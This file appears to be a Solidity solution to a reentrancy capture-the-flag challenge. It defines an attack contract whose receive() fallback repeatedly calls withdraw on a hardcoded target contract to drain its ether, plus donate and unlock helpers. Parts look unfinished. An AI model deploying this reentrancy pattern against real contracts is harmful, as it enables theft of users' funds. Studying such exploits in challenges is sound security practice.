// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface I4C { // 定義外部合約介面 interface for contract
  function donate(address)   external payable ;
  function withdraw(uint256) external returns (bool success);
  function unlock()          external;
  function isSolved()        external returns (bool);
  }

contract ReentranceAttack {

  address _tc;
  I4C tc; // target contract - reentrance

  event Start(address indexed _target, uint256 _balance);
  event Stop(address indexed _target, uint256 _balance);
  event Reenter(address indexed _target, uint256 _balance);
  event Log(address sender, uint256 amount);

  constructor() {
    _tc = 0x3ab6695f2C12302e062489B6d2ef817be7F98687;
    tc = I4C(_tc);
    }

  receive()  external payable {
    tc.withdraw(0.0011 ether);
    emit Log(_tc, address(this).balance);
    }

  function attack() public payable {
    tc.donate{value: 0.0011 ether}(address(this));
    emit Start(_tc, address(this).balance);
    //tc.withdraw(0.001 ether);
    //emit Start(address(tc), address(this).balance);
    }

  function unlock() external {
    (bool success,) = _tc.call{value: 0.0011 ether}("");
    require(success, "transfer failed");
    tc.unlock(); //
    }

  }
